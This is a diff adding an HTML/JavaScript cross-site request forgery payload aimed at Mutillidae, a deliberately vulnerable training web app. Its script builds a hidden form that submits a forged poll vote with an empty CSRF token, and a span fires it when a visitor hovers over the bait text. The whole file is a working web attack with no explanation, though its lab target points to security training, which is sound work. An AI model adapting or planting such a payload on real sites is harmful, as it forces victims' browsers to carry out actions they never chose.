@@ -1,0 +1,41 @@
+<script>
+function sendcsrf(){
+	var lForm = document.createElement("FORM");
+	lForm.action="http://mutillidae.local/index.php";
+	lForm.method = "GET";
+	lForm.enctype="application/x-www-form-urlencoded";
+	document.body.appendChild(lForm);
+
+	var lPage = document.createElement("INPUT");
+	lPage.setAttribute("name", "page");
+	lPage.setAttribute("type", "hidden");
+	lPage.setAttribute("value", "user-poll.php");
+	lForm.appendChild(lPage);
+
+	var lCSRFToken = document.createElement("INPUT");
+	lCSRFToken.setAttribute("name", "csrf-token");
+	lCSRFToken.setAttribute("type", "hidden");
+	lCSRFToken.setAttribute("value", "");
+	lForm.appendChild(lCSRFToken);
+	var lChoice = document.createElement("INPUT");
+	lChoice.setAttribute("name", "choice");
+	lChoice.setAttribute("type", "hidden");
+	lChoice.setAttribute("value", "nmap");
+	lForm.appendChild(lChoice);
+
+	var lInitials = document.createElement("INPUT");
+	lInitials.setAttribute("name", "initials");
+	lInitials.setAttribute("type", "hidden");
+	lInitials.setAttribute("value", "JD");
+	lForm.appendChild(lInitials);
+
+	var lButton = document.createElement("INPUT");
+	lButton.setAttribute("name", "user-poll-php-submit-button");
+	lButton.setAttribute("type", "hidden");
+	lButton.setAttribute("value", "Submit Vote");
+	lForm.appendChild(lButton);
+
+	lForm.submit();
+}
+</script>
+<span onmouseover="sendcsrf();">Vote for nmap. I know you will.</span>
